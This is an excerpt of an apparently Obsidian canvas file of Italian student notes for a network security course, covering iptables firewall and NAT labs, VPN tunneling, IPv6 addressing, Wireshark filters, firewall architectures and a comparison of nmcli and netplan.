		{"id":"ca97738d0078a8f7","type":"text","text":"# Laboratorio 4 - Firewall & NAT\n\n##### `Ex1`\n\nDobbiamo collegarci come rete esterna alla rete interna generata da Katharà. Usiamo quindi `./connect-lab.sh 192.168.10.2/24 external` dove il nome della rete è stato definito in `lab.conf` e l'indirizzo deve essere coerente con quello che definiamo in `r1.startup`. Chiaramente manca la `route` per la sottorete a cui vogliamo arrivare, quindi `ip route add 192.168.100.0/24 via 192.168.10.1`.\n\nObiettivo: settare un ***host-based firewall*** sul `pc1`. Facciamo un paio di esempi:\n\n- Bloccare i `ping` verso `pc1` - Usiamo `iptables -A INPUT -p icmp --icmp-type echo-request -j DROP`. `-p` intuitivamente si riferisce al protocollo, e `--icmp-type` è un'opzione aggiuntiva all'interno del protocollo `icmp`. Cancelliamo tutto con `iptables -F` (`flush`) e andiamo al prossimo;\n- Il server Apache sta ascoltando sulla `porta 80`, quindi possiamo raggiungerlo dalla VM da browser. Al momento possiamo pingare il server perché nessuno ce lo impedisce, ma ora vogliamo autorizzare solo i pacchetti `HTTP`. `iptables -A INPUT -p tcp --destination-port 80 -j ACCEPT`, quindi `iptables -A INPUT -j REJECT`. In pratica ho messo il `default deny` e ho esplicitamente autorizzato le connessioni sulla `porta 80`. Stavolta ho messo `REJECT`, quindi in risposta al `ping` mi arriva un `port unreachable`, o un `connection refused`, se uso per esempio `ssh`. In entrambi i casi sono messaggi `ICMP`. Nota che `ssh` non si arrende subito se dall'altra parte fanno `DROP` (non gli arriva alcun riscontro, potrebbe essere solo lenta la connessione), mentre rinuncia all'istante se riceve un messaggio di connessione rifiutata. Possiamo vedere bene questa cosa facendo `tcpdump` sul `router`;\n- Nota che di default la policy è un `default accept`. Possiamo giocare a cambiarla in una più safe `default deny`.\n\nOk, questa cosa di `pc1` era un esempio. Va fatta sul `router`. Vedi il prossimo esercizio che concettualmente è identico.\n\n- Se faccio `default deny` + `ACCEPT dst=192.168.100.80 dport=80` le risposte vengono bloccate. Devo aggiungere `ACCEPT src=192.168.100.80 sport=80`;\n- Nota che però così `pc1` è isolato. Posso sbloccarlo aggiungendo `ACCEPT src=pc1 -m state --state NEW, ESTABLISHED` e analogo con `dst=pc1 -m state --state ESTABLISHED`.\n\n##### `Ex2`\n\nStessa cosa di prima ma fatta sul `router` e su `IPv6`. Cambia poco: usiamo `ip6tables`, specifichiamo gli indirizzi `IPv6` tra parentesi quadre e salviamo le rules sulla chain `-A FORWARD`.\n\n##### `Ex3`\n\nSegmentiamo la rete e creiamo una ***DMZ***.\n\n<span style=\"color:rgb(236, 155, 14)\">Non ho implementato nessuno di questi esercizi, c'è solo la descrizione</span>\n\n###### `Ex4`\n\n***Masquerade*** & un po' di ***Firewall***\n\nSe proviamo a fare richieste verso Internet con i `pc` notiamo che non riceviamo risposte. Con un rapido `tcpdump` sul `router` notiamo che le richieste vengono fatte con l'indirizzo privato dei `pc`. Dobbiamo aggiungere una regola NAT per tradurlo in un indirizzo pubblico, quindi `iptables -t nat -A POSTROUTING -o eth -j MASQUERADE` , cioè \"`Nella tabella NAT, aggiungi una regola tale che su qualsiasi pacchetto in uscita (POSTROUTING & -o) sull'interfaccia eth1 venga fatto Source NAT`\".\n\nTre policies da implementare (Firewall), vedi slides.\n\n######  `Ex5`\n\nSimile a prima, ma ora abbiamo dei server dietro NAT -> ***port forwarding*** (***DNAT***).\n\n###### `Ex6`\n\nSimile a prima, ma ora abbiamo due LAN private diverse.\n\n###### `Ex7`\n\nTransparent Firewall (l'ha mezzo posto come opzionale)\n\n\n<span style=\"color:rgb(236, 155, 14)\">FAI QUESTI ESERCIZI PERCHé COMPAIONO ALLO SCRITTO A QUANTO PARE\nSe serve riguarda la parte finale di 24/04/2025 iptables NAT lab</span>","x":-4025,"y":20641,"width":1259,"height":2260,"color":"3"},
		{"id":"ce4607f17ebab4a0","type":"file","file":"Area Lab5 - VPN/VPN_Types.gif","x":-9569,"y":20289,"width":504,"height":292},
		{"id":"f9fda8fc0b502de2","type":"text","text":"# Schemino coi Colori I - DDL & Network Tunnel\n\nSei un client VPN sulla <span style=\"color:#cd0a0a\">LAN1</span> e vuoi apparire sulla <span style=\"color:#00b050\">LAN2</span> remota tramite un <span style=\"color:#6969FF\">server VPN remoto</span>  raggiungibile tramite Internet, i.e. si traduce nel fare tunneling a livello di DLL, quindi dal punto di vista di quello che esce dalla tua macchina fisica stai creando un pacchetto fatto nel seguente modo: <span style=\"color:#cd0a0a\">Ethernet( IP(</span><span style=\"color:#6969FF\"> Trasporto( Applicazione(</span><span style=\"color:#00b050\"> Ethernet( IP( Dati))</span><span style=\"color:#6969FF\">))</span><span style=\"color:#cd0a0a\">))</span>.\n\nCome si ottiene questo risultato? Il client VPN fa creare al SO una nuova interfaccia, `tap0`, avente un proprio <span style=\"color:#00b050\">MAC Address</span>. Il SO ha l'illusione di essere connesso direttamente alla <span style=\"color:#00b050\">LAN2</span> tramite l'interfaccia `tap0`, quindi genera e manda su `tap0` dei pacchetti <span style=\"color:#00b050\">Ethernet</span>. Il client VPN sa benissimo che non c'è alcun collegamento fisico, quindi prende questi <span style=\"color:#00b050\">frame</span> e li rende il <span style=\"color:#6969FF\">payload Applicazione</span> di una <span style=\"color:#6969FF\">connessione</span> con il <span style=\"color:#6969FF\">server VPN</span>. Il pacchetto quindi viene incapsulato nei protocolli <span style=\"color:#cd0a0a\">IP</span> ed <span style=\"color:#cd0a0a\">Ethernet</span> coerenti con la <span style=\"color:#cd0a0a\">LAN1</span> e inviati tramite `eth0` o `wls2p0`. Il pacchetto multicolore arriva al <span style=\"color:#6969FF\">server VPN</span>, il quale decapsula e si ritrova il pacchetto <span style=\"color:#00b050\"> Ethernet( IP( Dati))</span>.\n\nIn pratica, il risultato di tutto questo è aver creato un ***tunnel*** (***host-to-site***, in questo caso) tra l'interfaccia `tap0` del tuo `host` e quella `eth` del <span style=\"color:#6969FF\">server VPN</span>, che è davvero fisicamente connessa alla <span style=\"color:#00b050\">LAN2</span>. Il tunnel viene interamente creato e gestito dal client VPN.\n\nDiscorso simile per un tunnel a livello di rete, l'unica differenza è che uso direttamente l'<span style=\"color:#6969FF\">IP</span> del <span style=\"color:#6969FF\">server VPN</span>, quindi <span style=\"color:#cd0a0a\">Ethernet( IP(</span><span style=\"color:#6969FF\"> Trasporto( Applicazione( IP( Dati))))</span><span style=\"color:#cd0a0a\">))</span>. L'interfaccia in questo caso si chiama convenzionalmente `tun0` (`tunnel`, `tap` è `test access point`).","x":-10580,"y":19072,"width":759,"height":583,"color":"4"},
		{"id":"f2a5e9e12f5c5268","type":"text","text":"# Schemino coi Colori II - Livelli di Implementazione\n\nNel prequel abbiamo scritto i vari pacchetti assumendo che il <span style=\"color:#6969FF\">server VPN</span> avesse bisogno di arrivare fino al <span style=\"color:#6969FF\">layer Applicazione</span> per decidere cosa fare con il payload. Non è sempre così.\n\n- Il <span style=\"color:#6969FF\">layer Applicazione/Trasporto</span> è il jolly per qualsiasi tipo di oggetto trasportato dal tunnel, sia esso un <span style=\"color:#00b050\">frame Ethernet</span> o <span style=\"color:#6969FF\">IP</span> (lo metto blu perché verosimilmente a livello di Rete vuoi apparire con l'`IP` del <span style=\"color:#6969FF\">server VPN</span>);\n\t- Viene usato da client VPN come ***openvpn***, ma può farlo anche ***ssh*** (con l'opzione `-w`), ***Secure Socket Tunneling Protocol*** (***SSTP***, basato su ***SSL/TLS***) e ***WireGuard***;\n\t- Schema `tap`: <span style=\"color:#cd0a0a\">Ethernet( IP(</span><span style=\"color:#6969FF\"> Trasporto( Applicazione(</span><span style=\"color:#00b050\"> Ethernet( IP( Dati))</span><span style=\"color:#6969FF\">))</span><span style=\"color:#cd0a0a\">))</span>;\n\t- Schema `tun`: <span style=\"color:#cd0a0a\">Ethernet( IP(</span><span style=\"color:#6969FF\"> Trasporto( Applicazione( IP( Dati))</span><span style=\"color:#6969FF\">))</span><span style=\"color:#cd0a0a\">))</span>;\n- Il ***layer di Rete*** è tendenzialmente razzista. O meglio, visto che il suo protocollo di punta per questo tipo di applicazioni (<span style=\"color:#cd0a0a\">IPsec</span>) lavora con gli `Extension Header` è ottimale usarlo per incapsulare un altro pacchetto <span style=\"color:#6969FF\">IP</span> piuttosto che un <span style=\"color:#00b050\">frame Ethernet</span>, con eccezioni:\n\t- ***Generic Routing Encapsulation*** (***GRE***) è un protocollo \"adattatore\" compatibile con `IP`, `IPv6` e `IPsec` pensato per incapsulare al suo interno qualsiasi altro protocollo di livello 3, ma non offre cifratura (di solito si appoggia a `IPsec` per questo). Schema `tun` (e.g.):  <span style=\"color:#cd0a0a\">Ethernet( IPsec( </span><span style=\"color:#6969FF\"> IP( Dati))</span><span style=\"color:#cd0a0a\">))</span>.\n\t-  Protocolli ibridi come ***VXLAN***, ***PPTP*** ed ***L2TP*** riescono a farlo con il <span style=\"color:#00b050\">frame Ethernet</span>. Schema `tap` (e.g.) : <span style=\"color:#cd0a0a\">Ethernet( IPsec( <span style=\"color:#880088\">VXLAN( </span></span><span style=\"color:#00b050\"> Ethernet( IP( Dati))</span><span style=\"color:#cd0a0a\">)))</span>\n","x":-11592,"y":19072,"width":759,"height":583,"color":"4"},
		{"id":"eeb4c63215f051bf","type":"text","text":"# User Access Control\n\nCome detto, la *conditio sine qua non* per una VPN è l'autenticazione, quindi nel configurare un server VPN bisogna anzitutto definire i profili dei client previsti. Questo consente di implementare delle ***regole*** di ***User Access Control***, che possono regolare l'accesso per singoli utenti, gruppi di utenti o specifiche risorse.\n\nDi norma, questo si realizza con le ***routing tables***. Viene molto naturale se il server VPN è già nel `router/firewall/NAT`, ma non deve essere per forza così.\n\n\n\n\n\n\n\na seconda che sia sul bordo o dentro si chiama VPN (external?) o internal. Altrimenti si può mettere in DMZ. Insieme alle cose esposte ad Internet e a cose tipo IDS. DMZ può fare da filtro, in pratica. meglio la variante dual interfaces probabilmente, ma guarda meglio le slides.","x":-10580,"y":21214,"width":759,"height":427,"color":"3"},
		{"id":"e86f9bc36cd72309","type":"text","text":"# Free Proxies \n\nPotremmo essere tentati di usare siti come [questo](https://spys.one/en/) o [quest'altro](https://free-proxy-list.net/it/) per trovare un proxy gratuito. I motivi possono essere ovviamente molti: nascondere il nostro `IP` ai siti che vogliamo visitare, o farci geolocalizzare in un posto diverso per aggirare censure o problemi di copyright.\n\nOttimo, no? No.\n\nIntanto, questi proxy possono essere malevoli. Non c'è (quasi) nessun check da parte di questi siti che li listano: si limitano a scandagliare Internet in cerca di porte lasciate anche solo erroneamente aperte dai proprietari dei `server` (quando va bene), per poi guadagnare dalla pubblicità.\n\nPoi, non è detto che il proxy che scelgo faccia quello che voglio. Potrebbe essere `transparent`, o lentissimo in quanto congestionato (molti dispositivi IoT configurati male finiscono in queste liste).\n\nIn pratica, quando va bene questi servizi sono lenti, quando va male ti rubano i dati o espongono il tuo vero `IP`. Non usarli se non sai quello che stai facendo.","x":-10580,"y":21876,"width":759,"height":427,"color":"4"},
		{"id":"6033fbd5014b0cba","type":"text","text":"# PND 27/02\n\n6o67wtg\n\nACME è una rete virtuale in ambiente sapienza sulla quale implementare le cose del corso (sulla quale girano circa 15 VM). Usa una VM con Katharà, NON fare sta roba sul pc direttamente perché esplode tutto\n\ncompleteness\ncorrectness\neffort (scrivi più di 1-2 pagine nel report, che sennò si incazza)","x":-14994,"y":-1949,"width":759,"height":360},
		{"id":"e5fc1848775e11e1","type":"text","text":"## continua lec 1\n\n- find - looks for files (by name, size, ...)\n- la shell ha comandi interni ad essa ed esterni. con `which ls` trovi il percorso dei comandi esterni (se è interno non restituisce niente). `ls` è esterno\n- `man comando` restituisce il manuale di `comando`.\n- `apropos comando` ti dice cosa fa `comando`\n- `info comando` è la vecchia versione di `man comando`, ma su editor (man è su terminale)\n- `alias` restituisce tutte le shortcut alternative per i comandi\n\t- `ll` è `ls -afD`, se fai `ll /proc/` ti escono cose che non sono né `d` (directory) né `-` (file), ma `c` (??) o `s` (file compresso??) \n- cosa sono i gruppi `shadow` e `dialout` ???\n- s al posto di x = prima dell'esecuzione cambia la proprietà del file. `which passwd` e poi `ll /output/passwd` (vedrò la `s` sull'user, quando lo esegue il possesso passa a root). Vedi rec\n\t- mi sa che devi chiedergli cosa recuperare... SO2?\n\n`shadow` sono le password pare, e sono separate dal file `passwd`!!\nQuella NON è una RegEx!! è una EXPANSION del bash\n\n`for i in 'la -1 *a.txt'; do echo $i.backup; done`\n\nfa un backup di ....... guarda la rec. link simbolici con `ln`. \n\nanche per una parte sui permessi, è circa l'una e mezza \n\n`cat` = concatenate (cerca le motivazioni dietro ai comandi!!!)\n\n`echo '3 is a number' | wc -w | tr '[0-9]' '[n-z]'` che fa sta roba?\n\n- echo manda in output la frase\n- la prende word count (wc) con opzione -w (conta sola le parole), quindi restituisce 4\n- tr.....\n\n128 è 10000000....","x":-14994,"y":-1509,"width":759,"height":858},
		{"id":"213cb7424970c6c4","type":"text","text":"# Lec 28/02\n\nfuzzy attack?\n\nwireshark e simili modificano direttamente la NIC per entrare in promiscuous mode? questa cosa diventa difficile se la rete è segmentata (faccio diverse VLAN? o comunque lo switch è più intelligente del previsto e manda la roba solo al vero destinatario)\n\nARP requests are always broadcast ethernet packets\n\nposso collegare uno switch ad un altro switch. questo significa che ad una porta possono corrispondere più MAC\n\nARP tables for hosts, called CAM for switches (HW-based, so fast. in fact, destination is the very first info in ethernet so that switch can decide output port asap)\n\n- CAM overflow - costringo lo switch a non ricordarsi le cose in modo da fargli fare broadcast ogni volta (mi interessa per fare sniffing, altrimenti i packet non mi arrivano!)\n\nInternet non è una grande ethernet network perché sta roba si basa sui broadcast. per risolvere questo problema crei IP. similmente a come poi visto che è inefficiente fare routing su cose troppo grandi dividi in ISP (e poi BGP ecc)\n\nSapienza è connessa a GAR (?) che collega tutte le università italiane\n\nbroadcast su IP poco comune (satelliti, ping), di norma si ignora (per ovvi motivi). multicast più comune, specie su IPv6\n\nClassi ABCDE: guarda il primo 0. \n\n- A - 0xxxxxxx fino a 127\n- B - 10xxxxxx da 128 a 191, ecc...\n- C\n- D - 1110xxxx (multicast)\n- E - (unused) 111110xx\n\nnon si usa più perché la classe A è troppo grande, quindi CIDR (parte network e parte host)\n\nprivate networks (RFC1918, i.e. non-routable IPs) definisce 10.xxx.xxx.xxx, 172.16.xxx.xxx e 192.168.xxx.xxx (guarda slide 34)\n\nbroadcast è sempre \"tutti 1 nella host part\", anche se questo non produce in generale in CIDR un 255!","x":-14074,"y":-1578,"width":759,"height":997},
		{"id":"399d0f8bfe3f80d5","type":"text","text":"# IPv6 - 07/03\n\nad oggi abbiamo finito gli IPv4, e ne allochiamo di nuovi solo se qualcuno li restituisce a IANA. \n\nIoT con IPv6?\n\nIPv6 ha $\\sim 3.4\\cdot 10^{38}$ (o alla 36?) indirizzi. In teoria risolve la necessità di usare il NAT. Ogni hex sono 4 bit. 128 bit sono 32 esadecimali in 8 gruppi da 4. parte di rete e parte di host sono simmetriche (16 e 16 hex - sì, ma per essere precisi i primi 3 gruppi sono network, il quarto per la sottorete e gli altri gli host). huge amount of hosts, questo protegge gli host perché enumeration diventa difficilissimo (ci metti ordine secoli).\n\n:: comprime intere stringhe di 0. Non ogni singolo blocco da 4 hex!: cioè non si trova `AB::::CD:1200::10`, si comprime solo la più lunga (e se ce ne sono due uguali si comprime solo la prima). Quindi posso avere `2001:DB8:1000::1` (meaning `2001:DB8:1000:0:0:0:0:1`, typical exam question)\n\nslide 25 (ignora anycast) - no broadcast, diventa multicast\n\n- global unicast = identico a ipv4\n- link local sono usati solo in un link interno alla rete. ogni coppia che comunica in locale ha una coppia di ipv6.\n- unique local = indirizzi privati di ipv4\n- embedded ipv4 - retrocompatibilità\n\n\n","x":-13105,"y":-1392,"width":759,"height":625},
		{"id":"1aee8251fddfc28d","type":"text","text":"# Wireshark Lab - 07/03\n\nhijacking\n\nalternative per sniffare traffico\n\n- dumpcap solo capture dei packet, no analysis\n- tcpdump less flexible than wireshark (no display filter, no GUI)\n- netflow - non fa deep packet inspection, fa solo un sommario di quello che sta succedendo (conta i pacchetti, i byte, RTT, ...)\n- ne ha saltato uno\n\nsono tutti basati sulla libreria `pcap`.\n\nl'idea di wireshark è di dissezionare il pacchetto e trovare i limiti del frame (DLL), segmento (Trasporto), pacchetto (Applicazione).\n\nè scemo, nel senso che se vede una roba su porta 80 prova a dissezionarlo pensando sia http. il che ha senso, ma puoi fregarlo usando porte non standard.\n\ndue tipi di filtri\n\n- capture - quelli esclusi dal filtro vengono proprio persi\n- display - quelli esclusi non vengono mostrati (ma ws li ha presi!)\n\nberkley packet filter (BPF) syntax\n```\nprotocol(tcp, ip6, ...) direction (src, dst) type\n```\ncon `type` puoi fare N cose, tra cui operatori e simili. vedi slides\n\n","x":-12314,"y":-1458,"width":759,"height":757},
		{"id":"446577bee9616f15","type":"text","text":"# IPv6 II - 14/03\n\nmulticast\n- assigned - per protocolli x (qualsiasi indirizzo che inizia per `FF`)\n- solicited - ICMPv6 sostituisce ARP (che usa broadcast) con neighbour discovery. 24 bit per gli hosts\n\nunicast\n- global unicast - `2000::/3` significa che i primi 4 bit sono `0010`. Questo significa che gli indirizzi di global unicast iniziano con i ***bit*** `001`, quindi il primo quartetto di ***bit*** è `2 (0010)` o `3 (0011)`. Quindi il primo quartetto di ***hex*** va da `2000` a `3FFF`.\n\t- il global unicast rappresenta 1/8 del totale degli indirizzi! un'altra fetta di torta è divisa tra tutti gli altri \"protocolli\", il resto è inutilizzato;\n\t- Dico un ottavo perché con `/3` bit conti fino ad 8. Con la stessa logica un gruppo `/10` è un $2^{10}$-esimo del totale.\n\t- fanno sostanzialmente le veci degli indirizzi pubblici in IPv4\n- unique local - `FC00::/7` - corrispondono agli indirizzi privati in IPv4 (192.168.x.x, ...).\n\nil source IPv6 è sempre unicast, la destinazione qualsiasi (obv).\n\n`2001:DB8::/32` sono usati per giocare, mai su internet\n\nglobal routing prefix (la parte di rete), subnet ID, interface (host) - rule 3 1 4: incrementa di 1 il quarto quartetto di hex e cambierai sottorete entro la stessa rete\n\ne comunque è diviso a metà tra rete e host\n\nci sono talmente tanti indirizzi che potresti usarne uno diverso per ogni richiesta (che senso ha???? potrebbe averlo detto solo come esempio)\n\n\n\n##### link-local\n\nlink-local è solo entro rete/sottorete (tipo il MAC, infatti sei costretto ad averne almeno uno). Non attraversano il router. Pertanto, devono essere unici entro la rete (...come gli indirizzi privati. ma allora cosa cambia con unique local???). range da `FE80` a `FEBF`.\n\nPer questo qualsiasi interfaccia IPv6 ha sempre un indirizzo associato che inizia con `fe80` o simili entro range. `fe80` è self assigned, altrimenti gli altri sono per applicazioni specifiche. Tipicamente dopo `fe80` gli altri N sono tutti 0. Ma come genero una roba unica?\n\n- EUI-64 genera un IPv6 basandosi sulla NIC (tipo sul suo MAC, che in teoria è unico. OUI sono vendor-specifici e Device... sono per il device). Aggiunge `FFFE` in mezzo al mac, se lo vedo so che è EUI-64. poi flippa il 7mo bit (\"don't ask why\");\n- random (su 64 bit è improbabile fare la stessa scelta... speriamo!). Molti SO fanno così\n\naltrimenti manuale (common practice for routers).\n\nquesto link-local è cruciale per assegnare un global unicast address con il protocollo SLAAC (self assignment within the network): quando mi connetto, il router mi manda al link local un messaggio tipo `ciao, sono il gateway, auto-assegnati un ipv6 globale pls`. In pratica questo sostituisce DHCP.\n\n- riassumendo: mi connetto e mi auto-assegno un ip link-local ipotizzando sia unico (probabile). il router mi vede e si presenta, dicendomi che voglio comunicare con l'esterno devo passare da lui, ma in caso mi devo  assegnare un indirizzo globale.","x":-11454,"y":-1756,"width":759,"height":1353},
		{"id":"09b849ff0d1ee8ad","type":"text","text":"# 21.3\n\nogni multicast parte con 8 uni (FF). \n\nflag - si usa quasi solo lo 0 (permanent assigned by IANA)\n\nall devices: router advertisement\n- ma quindi è un broadcast? ... non proprio, perché non è su IPv6 ma sul MAC (?)\nall routers: discovery\necc\n\nserver DHCP può essere non nella stessa rete. il router fa da tramite.\n\nIPv6 toglie checksum perché c'è già a livello 2 (ethernet) e livello 4 (TCP, UDP)\n\n(Encryption a livello 2 è ottima, perché non si vede manco la destinazione di IP)-> non so cosa c'entra, mi sa che sta parlando di eduroam con quelli a distanza\n\nIPv4 ha header di dimensione variabile a causa delle options. Con IPv6 è sempre 40 bytes.\n- evito di distinguere header size (IHL, espresso in numero di word da 32bit, in genere 5 se non ci sono opzioni) e payload size (total len)\n\t- questo perché 99% dei pacchetti non usava opzioni. se serve, complichiamo, dice ipv6.\n- inizio subito a leggere\n\nnota che anche in v6 ci sono le options. \n\ntraffic class è il tipo di servizio da offrire (e.g. real time, ecc)\n\nflow label è una novità. non lo usa quasi nessuno. si può usare per raggruppare diversi pacchetti. IPv4 è stateless, questo può rendere IPv6 un po' stateful (i.e. se diversi pacchetti fanno parte dello stesso flow). diverse connessioni TCP dovrebbero avere diversi flow label. \n\nnext header è il modo di interpretare i prossimi 40bytes. di norma è (zero?) se ci sono dati, altrimenti c'è un extension header (per le opzioni?). Si possono fare in catena (chain of...). questa roba si legge solo end-to-end (a parte specifiche routing e hop-to-hop). in pratica solo gli edge processano le options, tutti gli altri router intermedi leggono una roba fissa e forwardano velocissimi.\n\n- routing permette di speciicare il path per la destinazione\n- ESP (encryption, usato per le VPN), AH (authentication, nessuno può modificare senza che il destinatario lo sappia, hash firmato con (la chiave del sender NO! PEERCHé NO???) con un message authentication code) serve per IPSec (implementarlo qui te lo applica su tutti i layer superiori).\n\t- spe forse MAC è hash crittato con chiave simmetrica\n- l'ordine delle options è importante (vedi slides). perché due volte destination? la seconda è crittata.","x":-10520,"y":-1509,"width":759,"height":1146},
		{"id":"0a2425b5c932bbd1","type":"text","text":"# 04.04 - Firewall\n\ntrade off tra effort di deep packet inspection ed effettiva efficacia del firewall.\n\nusiamo iptables e un altro perché sono open source, diverse aziende ne usano diversi (con diverse sintassi). Tre livelli di astrazione:\n\n- policy (natural language)\n- corresponding filter rules\n- implementing filters /w right syntax\n\nraro andare in application layer, al più ci si ferma a trasporto (filtro su TCP/UDP). Se serve c'è un filtro apposito per l'application layer, ma più interno: l'idea è avere una catena di firewall tali che quello esterno filtra su IP (DLL non è davvero necessario in genere), poi dentro faccio un filtro \"finer grain\". Credo si chiami defense-in-depth: multiple overlapping system, anche con redundancy (se uno di loro faila, ce ne sono altri), è balance tra difesa e complessità.\n\nUn firewall è un router che però non forwarda tutto. Con che logica? Le filter rules. Access Control List (ACL) è il primo livello di filtro.\n\nslide 7 - principi di design che lui dice \"potrei entrare in dettaglio, ma suvvia, sono ovvi\". Guardali lo stesso perché sta gente fa cybersec da quando e nata e tu no.\n\nhost based - firewall su pacchetti diretti ad un particolare host, non filtro sulla rete in generale. ufw, pf su unix?\n\nACL è il firewall come te lo immagini, si chiama screening router. whitelist/blacklist differenti per incoming/outcoming traffic. Questo setup è stateless (\"no context, only content\")\n\nLivello 2 - Dual Homed Host (or Bastion Host). Non solo ACL, qualcosa in più: è dedito a proteggere con un SW, ma ha SOLO quello. Si parla di hardening quando tolgo tutte le altre possibili cose fancy che potrebbero rivelarsi vulterabilità.\n\nDMZ - piccola rete interna che posso esporre ad internet.\n\nGuarda slides per configurazioni possibili.\n\nslide 17 - ad esempio per accedere ad internet dall'internal zone potrei essere costretto a passare per la dmz.\n\nslide 21 - nota che outgoing interface... no non ho capito. A me sembra ovvio ma forse no.\n\nrules sono organizzate in chains, vedi HowToFirewall sopra.\n\nvedi slides per esempi di regole\n\nslide 31 - \"blocco il traffico incoming con IP identici a quelli interni\" eh ma con gli indirizzi privati che ormai sono pubblici? che facciamo?\n\nmolti firewall bloccano lo spoofing. potrei però appoggiarmi ad un proxy e dirgli di fare spoofing al posto mio?\n\nporta >1023 -> è una risposta. poi fa un esempio di regole che sembrano buone ma non lo sono. pensa sempre a come attaccare le regole dall'esterno (e guarda la rec).\n\n(vabbè ma qui il punto è: faccio regole perfette e permetto solo una connessione (e.g smtp) legittima, nel senso sulle giuste porte. Chi vieta all'attaccante di mettere nel payload della roba brutta in delle richieste legittime? tipo fare injection o simili? vabb questa è na cosa mia, non l'ha detto, ma forse si risolve con IDS e simili)\n\npoi fa problemi di frammentazione IP e SYN flooding tipo e introduce i firewall stateful. in pratica connection tracking networks servono a verificare che i singoli pacchetti abbiano senso all'interno di una connessione. \n\nriguardati bene il funzionamento di TCP.\n\nquesto vale per i protocolli stateful. e per quelli stateless, tipo ping request, ICMP, HTTP? Il firewall stesso crea la nozione di connessione anche tipo su UDP. Cioè, anche se la connessione in sé non esiste, il firewall tiene traccia del flusso per un certo periodo di tempo per controllare cosa succede. Non è troppo difficile, vedrai un match tra source/destination che si invertono nel pacchetto nel verso opposto (richiesta/risposta). Posso in questo modo accettare roba dall'esterno solo se la connessione viene originata da un computer interno alla rete.\n\n`iptables` può implementare stateful firewall.\n\ninfine abbiamo il livello proxy, cioè scendo fino all'applicazione. Qui andiamo su roba super application-specific. è difficile parlare di firewall in questo caso, perché ogni applicazione ha il suo. piuttosto a questo livello arriva l'IDS per capire cosa c'è nel pacchetto.\n\nè molto utile per protezione da varie ed eventuali, tipo injection e simili. è limitato però da TLS ed encryption in generale, quindi non è ovvio capire cosa c'è nei pacchetti.\n\nSOCKS? riascolta sta parte (tcp relay, simile al tor routing)\n\nsaltato una slide perché mi sono distratto 12 secondi\n\nNG-Firewalls introduce un botto di roba","x":-9625,"y":-2070,"width":759,"height":1982},
		{"id":"71499de8ad7936a0","type":"text","text":"# Implementare le Policies\n\n\n\n\nslide 31 - \"blocco il traffico incoming con IP identici a quelli interni\" eh ma con gli indirizzi privati che ormai sono pubblici? che facciamo?\n\nmolti firewall bloccano lo spoofing. potrei però appoggiarmi ad un proxy e dirgli di fare spoofing al posto mio?\n\nporta >1023 -> è una risposta. poi fa un esempio di regole che sembrano buone ma non lo sono. pensa sempre a come attaccare le regole dall'esterno (e guarda la rec).\n\n(vabbè ma qui il punto è: faccio regole perfette e permetto solo una connessione (e.g smtp) legittima, nel senso sulle giuste porte. Chi vieta all'attaccante di mettere nel payload della roba brutta in delle richieste legittime? tipo fare injection o simili? vabb questa è na cosa mia, non l'ha detto, ma forse si risolve con IDS e simili)\n\npoi fa problemi di frammentazione IP e SYN flooding tipo e introduce i firewall stateful. in pratica connection tracking networks servono a verificare che i singoli pacchetti abbiano senso all'interno di una connessione. \n\nriguardati bene il funzionamento di TCP.\n\nquesto vale per i protocolli stateful. e per quelli stateless, tipo ping request, ICMP, HTTP? Il firewall stesso crea la nozione di connessione anche tipo su UDP. Cioè, anche se la connessione in sé non esiste, il firewall tiene traccia del flusso per un certo periodo di tempo per controllare cosa succede. Non è troppo difficile, vedrai un match tra source/destination che si invertono nel pacchetto nel verso opposto (richiesta/risposta). Posso in questo modo accettare roba dall'esterno solo se la connessione viene originata da un computer interno alla rete.\n\n`iptables` può implementare stateful firewall.\n\ninfine abbiamo il livello proxy, cioè scendo fino all'applicazione. Qui andiamo su roba super application-specific. è difficile parlare di firewall in questo caso, perché ogni applicazione ha il suo. piuttosto a questo livello arriva l'IDS per capire cosa c'è nel pacchetto.\n\nè molto utile per protezione da varie ed eventuali, tipo injection e simili. è limitato però da TLS ed encryption in generale, quindi non è ovvio capire cosa c'è nei pacchetti.\n\nSOCKS? riascolta sta parte (tcp relay, simile al tor routing)\n\nsaltato una slide perché mi sono distratto 12 secondi\n\nNG-Firewalls introduce un botto di roba","x":-8767,"y":-1644,"width":759,"height":1089},
		{"id":"1277687575074913","type":"text","text":"`nmcli` e `netplan` sono **strumenti di configurazione della rete su Linux**, ma servono a scopi diversi e si usano in contesti diversi.\n\n---\n\n### ✅ **`nmcli` (NetworkManager Command Line Interface)**\n\n- È l’interfaccia **a riga di comando** per **NetworkManager**\n    \n- NetworkManager è un **demone** che gestisce in automatico le connessioni di rete (wired, wireless, VPN, ecc.)\n    \n- `nmcli` permette di:\n    \n    - Creare, modificare, eliminare connessioni\n        \n    - Connettersi a WiFi\n        \n    - Visualizzare lo stato della rete\n        \n    - Attivare/disattivare interfacce\n        \n\n📌 Tipico di desktop Ubuntu/Fedora o di sistemi dove NetworkManager è installato.\n\n#### Esempio:\n\n```bash\nnmcli dev wifi list\nnmcli con add type ethernet ifname eth0 ip4 192.168.1.10/24\n```\n\n---\n\n### ✅ **`netplan`**\n\n- È un sistema di **configurazione statica della rete basato su file YAML**\n    \n- Usato principalmente su **Ubuntu Server (da 17.10 in poi)**\n    \n- È un layer _frontend_ che genera configurazioni per:\n    \n    - **systemd-networkd**\n        \n    - o **NetworkManager**\n        \n\n📌 Si configura modificando `/etc/netplan/*.yaml`  \ne applicando con:\n\n```bash\nsudo netplan apply\n```\n\n#### Esempio file `/etc/netplan/01-netcfg.yaml`:\n\n```yaml\nnetwork:\n  version: 2\n  ethernets:\n    eth0:\n      dhcp4: false\n      addresses: [192.168.1.100/24]\n      gateway4: 192.168.1.1\n      nameservers:\n        addresses: [8.8.8.8]\n```\n\n---\n\n### 🔄 Confronto rapido\n\n|Caratteristica|`nmcli`|`netplan`|\n|---|---|---|\n|Interfaccia|CLI interattiva|Configurazione via YAML|\n|Backend|NetworkManager|systemd-networkd / NetworkManager|\n|Usato tipicamente|Desktop Linux|Ubuntu Server|\n|Modalità|Dinamico|Statico o semi-statico|\n\nVuoi sapere quale usare nel tuo caso?","x":-10005,"y":281,"width":759,"height":1610},
